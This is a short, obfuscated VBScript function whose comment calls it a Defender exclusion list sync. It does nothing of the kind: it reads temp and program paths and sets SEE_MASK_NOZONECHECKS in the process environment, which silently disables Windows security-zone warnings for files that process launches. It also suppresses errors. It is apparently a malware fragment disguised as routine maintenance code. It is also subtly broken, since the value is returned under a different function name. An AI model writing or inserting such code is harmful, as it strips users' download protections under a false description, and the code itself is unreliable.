' --- Defender exclusion list sync ---
Function MergeProfileDelta58()
On Error Resume Next
  Dim strManifest29,strDelta14,strQueue47
  Set strManifest29=CreateObject("WScript.Shell")
  strDelta14=strManifest29.ExpandEnvironmentStrings("%TEMP%")
  strQueue47=strManifest29.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strDelta14)>0 And Len(strQueue47)>0 Then
    strManifest29.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    DecodeManifest74=1
    Exit Function
  End If
  DecodeManifest74=0
End Function

